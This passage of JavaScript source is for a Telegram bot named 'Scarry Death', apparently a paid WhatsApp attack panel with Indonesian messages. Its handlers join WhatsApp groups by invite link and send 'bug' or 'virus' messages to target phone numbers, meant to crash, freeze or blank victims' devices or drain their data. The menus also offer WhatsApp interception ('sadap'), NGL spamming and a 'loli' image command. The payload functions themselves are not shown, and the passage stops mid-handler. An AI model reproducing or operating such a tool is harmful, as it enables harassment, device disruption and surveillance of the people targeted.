// --------------------- ( FUNCTION GROUP ONLY ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('KANJUT HIDENG/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('KANJUT HIDENG/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('KANJUT HIDENG/premium.json');
            ensureFileExists('KANJUT HIDENG/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('KANJUT HIDENG/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('KANJUT HIDENG/admin.json', JSON.stringify(adminUsers, null, 2));
            }
            
         async function premium(userId) {
        return premiumUsers.some( user => user.id === userId && new Date(user.expiresAt) > new Date()
  );
}

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('KANJUT HIDENG/premium.json', (data) => (premiumUsers = data));
    watchFile('KANJUT HIDENG/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

//------( FUNCTION BLACKLIST )-------\\
if (fs.existsSync(blacklistFile)) {
  blacklistedCommands = JSON.parse(fs.readFileSync(blacklistFile));
}

function saveBlacklist() {
  fs.writeFileSync(blacklistFile, JSON.stringify(blacklistedCommands));
}


///-----( FUNCTION MEMORY )\\\
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

///----- ( FUNCTION RUNTIME  )----\\\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}

///----- ( FUNCTION DATE NOW )-----\\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}


//----- ( RANDOM IMAGE )-----\\
function getRandomImage() {
        const images = [
"https://qu.ax/gvLbX.jpg",  
  ];
  return images[Math.floor(Math.random() * images.length)];
}

///----- ( FUNCTION COLDOWN )---\\\
  let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL);
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    
  } catch (err) {
    console.log(chalk.red("⚠️ Gagal membaca control.txt"));
    BOT_ACTIVE = false;
  }
}
setInterval(checkControlStatus, 10 * 1000);
checkControlStatus();                  
bot.onText(/\/menu/, async (msg) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const date = getCurrentDate();
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
 const memoryStatus = formatMemory();
 const randomImage = getRandomImage();
 const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
 const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
 const ownerid = config.OWNER_ID
 const chatType = msg.chat.type;
 const audio = fs.createReadStream("SINGGLE ERA/lagu.mp3");
    
 if (isGroupOnly() && chatType === 'private') { return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.'); }
   
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     

      const iiftzy =  await bot.sendPhoto(chatId, randomImage, {
        caption: `
   <blockquote>🜲 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 🜲</blockquote>
( 🌇 ) - 情報 𝗢𝗹𝗮𝗮 ${username}!
─ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
 <blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 𝙳𝙴𝙰𝚃𝙷 ϟ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</blockquote>
ケ ボット名 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 走っている : 𝘑𝘢𝘷𝘢𝘚𝘤𝘳𝘪𝘱𝘵
ケ 日次データ : ${date}
⎋ ユーザー名 : ${username}
⎋ ユーザーID : ${chatId}
⎋ モード : ${mode}
🛡️ PROTECTION
<blockquote>» Bypass Protection
» Scurity Token
» Encrypt Hard
» Update Otomatis</blockquote>
 <blockquote>( ! ) sᴇʟʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ʙᴇʟᴏᴡ</blockquote>
  `, 

          
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id,
  reply_markup: {
    inline_keyboard: [
      [
        { text: "𝚃𝚘𝚘𝚕𝚜 ✘", callback_data: "tools" },
      { text: "𝚂𝚊𝚍𝚊𝚙 ✘", callback_data: "sadap" },
      { text: "𝚂𝚎𝚜𝚜𝚒𝚘𝚗 ✘", callback_data: "session" }
    ],

    // Baris kedua
    [
      { text: "𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 ✘", url: "https://t.me/raraa_imuppp" },
      { text: "𝙲𝚑𝚊𝚗𝚗𝚎𝚕 ✘", url: "https://t.me/kepoluyee" },
    ],

    // Baris ketiga
    [
      { text: "𝚂𝚌𝚊𝚛𝚛𝚢 𝙰𝚝𝚝𝚊𝚌𝚔 ✘", callback_data: "scarrybug" },
      { text: "𝚂𝚌𝚊𝚛𝚛𝚢 𝚂𝚎𝚝𝚝𝚒𝚗𝚐 ✘", callback_data: "settings" }
      ]
    ]
  }
});

          
  
       await bot.sendAudio(chatId, audio , {
            title: "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐",
            performer: "tolong untuk di baca ya😊",
            caption: `<pre>Seburuk apapun masa lalumu, itu telah berlalu. Sekarang, fokus untuk kebahagiaan dirimu di masa depan...</pre>`,
            parse_mode: "HTML", 
            reply_to_message_id: iiftzy.message_id,
        });
});


   bot.on("callback_query", (callbackQuery) => {
          const chatId = callbackQuery.message.chat.id;
          const messageId = callbackQuery.message.message_id;
          const data = callbackQuery.data;
          const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
          const newImage = getRandomImage();
          const runtime = getBotRuntime();
          const memoryStatus = formatMemory();
          const date = getCurrentDate();
          const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
          const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
          const ownerid = config.OWNER_ID
          
          let newCaption = "";
          let newButtons = [];

          if (data === "scarrybug") {
         newCaption = `
<blockquote>DELAY ϟ OPTION</blockquote>
  ❀ /invisdelay 628xx - Delay Invisible
  ❀ /mentioninvis 628xx -  Delay Invisible Mention
  ❀ /drainkouta 628xx - Sedot kouta
<blockquote>BLANK UI ϟ OPTION</blockquote>
  ❀ /blankinfinity 628xx - Blank Device
  ❀ /crashhome 628xx - Crash Device
  ❀ /blankdevice - Blank Screen Device
<blockquote>FORCLOSE ϟ OPTION</blockquote>
  ❀ /force - Force Close Click device
<blockquote>GROUP ⵢ OPTION</blockquote>
  ❀ /blankgroup link - blank all memb
<blockquote>IOS ⵢ OPTION</blockquote>
  ❀ /crashios 62xx - Crash Apple
  ❀ /fciphone 62xx - Crash Force Apple
  ❀ /forceios 628xx - Forclose Apple
<blockquote>𝚃𝙴𝚂 ⵢ 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽</blockquote>
  ❀ /tesfunction 628xx,loop - replay file/text

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
 newButtons = [
          [
          { text: "BACK ⵢ TO!!", callback_data: "mainmenu" } 
          ], 
          ];
          
            } else if (data === "settings") {
           newCaption = ` 
<blockquote>CONTROLS ϟ MENU</blockquote>
 𐙚 /info - replay pengguna
 ‪‪𐙚 /addprem - Add premium user
 𐙚 /delprem - delete premium users
 𐙚 /addadmin - add admin user
 𐙚 /deladmin - delete admin users
 𐙚 /listprem - list user premium
 𐙚 /setjeda 1m - coldown 
 ‪‪𐙚 /gruponly on|of
 ‪‪𐙚 /addsender 628xx - addsender number
 ‪‪𐙚‬ /delsender 628xx - delsender number
 ‪‪𐙚‬ /listsender - menampilkan all sender
<blockquote>BLACKLIST ϟ COMMAND MENU</blockquote>
 ‪‪❤︎‬ /block - block command
 ‪‪❤︎‬ /unblock - unblock command
 ‪‪❤︎‬ /listblock - list command block
 
©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
newButtons = [
          [
          { text: "BACK ⵢ TO!!", callback_data: "mainmenu" } 
          ], 
          ];
          
            } else if (data === "session") {
           newCaption = `
<blockquote>𖣂 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 ϟ MENU 𖣂</blockquote>
 ‪‪𐙚‬ /cadp - nama plta,pltc,domain
 𐙚 /eksekusi - nama
 𐙚 /listadp - menampilkan list
 𐙚 /deladp - nama
 
©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
 newButtons = [
          [
          { text: "BACK ⵢ TO!!", callback_data: "mainmenu" } 
          ], 
          ];
          
            } else if (data === "sadap") {
           newCaption = `        
 <blockquote>𝚂𝙰𝙳𝙰𝙿 ϟ MENU</blockquote>
 𐙚 /wa_on - aktifkan sadap whatsapp
 𐙚 /wa_off - mematikan sadap
 𐙚‬ /kirimpesan - sender target/idgc
 𐙚 /addstory - mengupload story wa

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
newButtons = [
           [
           { text: "BACK ⵢ TO!!", callback_data: "mainmenu" }
           ], 
           ];
             } else if (data === "tools") {
             newCaption = `
<blockquote>༑ TOOLS ϟ MENU! ༑</blockquote>
 ✦ /fixcode - replay file / text
 ✦ /chat - text - hubungi owner
 ✦ /cekid 
 ✦ /ig - 
 ✦ /cvid - teks to vidio
 ✦ /cekwa - nomor
 ✦ /aiXvideo
 ✦ /tourl - media
 ✦ /play - lagu
 ✦ /done - teks
 ✦ /enchard - reply file .js
 ✦ /getcode - link
 ✦ /nglspam
 ✦ /tiktok - url
 ✦ /cekip
 ✦ /hytamkan - reply photo
 ✦ /cekkhodam - random
 ✦ /cekpacar - random
 ✦ /cekcantik - random
 ✦ /cektampan - random
 ✦ /cekkaya - random
 ✦ /cekjanda - random
 ✦ /iqc - stiker iphone 
 ✦ /cekmiskin - random
 ✦ /ustadz - text
 ✦ /fakestory - rply foto name | text
 ✦ /emojimox - emoji1 emoji2
 ✦ /fakecall - nama,durasi
 ✦ /loli - get random image
 ✦ /bluearchive - get random image
 
©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
newButtons = [
             [
             { text: "BACK ⵢ TO!!", callback_data: "mainmenu" }
             ], 
             ];
               } else if (data === "mainmenu") {
              newCaption = `
<blockquote>🜲 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 🜲</blockquote>
( 🌇 ) - 情報 𝗢𝗹𝗮𝗮 ${username}!
─ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
 <blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 𝙳𝙴𝙰𝚃𝙷 ϟ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</blockquote>
ケ ボット名 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 走っている : 𝘑𝘢𝘷𝘢𝘚𝘤𝘳𝘪𝘱𝘵
ケ 日次データ : ${date}
⎋ ユーザー名 : ${username}
⎋ ユーザーID : ${chatId}
⎋ モード : ${mode}
🛡️ PROTECTION
<blockquote>» Bypass Protection
» Scurity Token
» Encrypt Hard
» Update Otomatis</blockquote>
 <blockquote>( ! ) sᴇʟʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ʙᴇʟᴏᴡ</blockquote>
  `, 
         newButtons = [
              [
                { text: "𝚃𝚘𝚘𝚕𝚜 ✘", callback_data: "tools" },
      { text: "𝚂𝚊𝚍𝚊𝚙 ✘", callback_data: "sadap" },
      { text: "𝚂𝚎𝚜𝚜𝚒𝚘𝚗 ✘", callback_data: "session" }
    ],

    // Baris kedua
    [
      { text: "𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 ✘", url: "https://t.me/raraa_imuppp" },
      { text: "𝙲𝚑𝚊𝚗𝚗𝚎𝚕 ✘", url: "https://t.me/kepoluyee" },
    ],

    // Baris ketiga
    [
      { text: "𝚂𝚌𝚊𝚛𝚛𝚢 𝙰𝚝𝚝𝚊𝚌𝚔 ✘", callback_data: "scarrybug" },
      { text: "𝚂𝚌𝚊𝚛𝚛𝚢 𝚂𝚎𝚝𝚝𝚒𝚗𝚐 ✘", callback_data: "settings" },
              ], 
              ];
              }
  bot.editMessageMedia(
            {
        type: "photo",
        media: newImage,
        caption: newCaption,
            parse_mode: "HTML"
            },
            { chat_id: chatId, message_id: messageId }
            ).then(() => {
            bot.editMessageReplyMarkup(
            { inline_keyboard: newButtons },
            { chat_id: chatId, message_id: messageId }
            );
            }).catch((err) => {
            console.error("Error editing message:", err);
            });
            });

// ----------------------------------- ( Case Bug & Case Plugin ) -------------------------------- \\
// Handler /blankgroup yang disesuaikan dengan struktur sessions kamu
bot.onText(/\/blankgroup (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/blankgroup')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Validasi link grup (terima parameter setelah ? juga)
  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /blankgroup https://chat.whatsapp.com/xxxx");
  }

  // Cek premium
  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
Gunakan /addprem terlebih dahulu untuk mengakses fitur ini.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "DEVELOPER •", url: "https://t.me/raraa_imuppp" }],
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    // Kirim status awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
• Pengirim : ${username}
• Target : ${rawParam}
• Command : /blankgroup
• Virus : Blank Infinity (Group Mode)
• Status : Sedang join grup...
• Date now : ${date}

© 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`,
      parse_mode: "HTML"
    });

    // Ambil koneksi WhatsApp aktif dari sessions (pakai instance pertama)
    const otax = Array.from(sessions.values())[0];
    if (!otax) {
      await bot.editMessageCaption(`❌ Tidak ada koneksi WhatsApp aktif.`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML"
      });
      return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif. Silakan jalankan /addsender untuk menambahkan session.");
    }

    // Ambil kode grup, hilangkan parameter ?... jika ada
    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      // lakukan accept invite lewat koneksi aktif
      groupJid = await otax.groupAcceptInvite(groupCode);
      await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
• Pengirim : ${username}
• Target : ${rawParam}
• Command : /blankgroup
• Status : Berhasil join grup! Mengirim bug...
• Date now : ${date}

© 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML"
      });
    } catch (e) {
      // Gagal join grup -> update pesan dan hentikan
      await bot.editMessageCaption(`❌ Gagal join grup: ${e.message}`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML"
      });
      return bot.sendMessage(chatId, `Gagal join grup: ${e.message}`);
    }

    // Eksekusi pengiriman bug ke groupJid
    console.log("\x1b[33m[PROSES]\x1b[0m Mengirim bug ke grup...");
    await grubraraa1(groupJid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim ke grup 🚀");

    // Update status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
• Pengirim : ${username}
• Target : ${rawParam}
• Command : /blankgroup
• Virus : Blank Infinity (Group Mode)
• Status : ✅ Sukses dikirim!
• Date now : ${date}

© 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK • GROUP", url: rawParam }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚠️ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/invisdelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
            const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

   
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
    
   if (blacklistedCommands.includes('/invisdelay')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access `, 
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /invisdelay
⪧ Virus  : Delay invisible
⪧ Status : Proses.. 
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayraraa1(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /invisdelay
⪧ Virus  : Delay invisible
⪧ Status : Succses.. 
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/blankinfinity (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium (senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
   if (blacklistedCommands.includes('/blankinfinity')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankinfinity
⪧ Virus  : Blank Infinity
⪧ Status : Proses... 
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    await blankraraa1(target);
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankinfinity
⪧ Virus  : Blank Infinity
⪧ Status : Sucses.. 
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/crashhome (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/crashhome')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
     
l
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
